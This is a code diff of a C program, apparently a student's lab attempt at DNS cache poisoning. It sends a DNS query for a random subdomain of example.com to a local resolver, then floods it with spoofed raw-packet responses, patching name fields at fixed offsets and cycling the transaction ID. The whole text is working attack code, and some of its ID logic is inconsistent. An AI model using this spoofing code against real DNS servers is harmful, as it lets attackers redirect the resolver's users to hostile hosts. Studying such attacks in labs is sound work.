@@ -64,19 +64,18 @@ int main()
     //##################################################################
     /* Step 1. Send a DNS request to the targeted local DNS server
               This will trigger it to send out DNS queries */
-		memcpy(ip_req+41, name, 5); 
+		memcpy(ip_req+41, name, 5); // Modify the name in the question field (offset=41)
 		send_dns_request(ip_req, n_req);
 		printf("attempt #%ld. request is [%.5s.example.com]\n, transaction ID is: [%hu]\n", ++i, name, transaction_id);
 	
     // Step 2. Send spoofed responses to the targeted local DNS server.
-    		memcpy(ip_resp+41, name, 5); // Modify the name in the question field (offset=41)
                 memcpy(ip_resp+64, name, 5); // Modify the name in the answer field (offset=64)
                 for(int j=0; j<14000; j++)
                 {
                         transaction_id = (rand()%65536)+1;
                         unsigned short id;
                         id = htons(j);
-                        memcpy(ip_resp+28, &id, 2);
+                        memcpy(ip_resp+28, &id, 2);//Modify the id in the transaction ID field (offset=28)
                         send_dns_response(ip_resp, n_resp);
                 }
 
@@ -92,7 +91,7 @@ int main()
  * */
 void send_dns_request(char * buffer, int pkt_size)				//ATTEMPT #2
 {
-	memcpy(buffer+29, name, 5);
+	//memcpy(buffer+29, name, 5);
 	send_raw_packet(buffer, pkt_size);
 	//sendto(sock, ip_req, n_req, 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
 }
@@ -103,13 +102,11 @@ void send_dns_request(char * buffer, int pkt_size)				//ATTEMPT #2
  * */
 void send_dns_response(char * buffer, int pkt_size)		        //ATTEMPT #2
 {
-	memcpy(buffer+29, name, 5);
-	memcpy(buffer+40, name, 5);
-	for(int i=0; i<65535; i++)
-		{unsigned short id = htons(i);
-		 memcpy(ip_resp + 28, &id, 2);
-		 send_raw_packet(buffer, pkt_size);
-		 //sendto(sock, ip_resp, n_resp, 0, (struct sockaddr *)&dest_info, sizeof(dest_info));}	 
+	//memcpy(buffer+29, name, 5);
+	//memcpy(buffer+40, name, 5);
+	
+	send_raw_packet(buffer, pkt_size);
+	//sendto(sock, ip_resp, n_resp, 0, (struct sockaddr *)&dest_info, sizeof(dest_info));}	 
 }
 
 
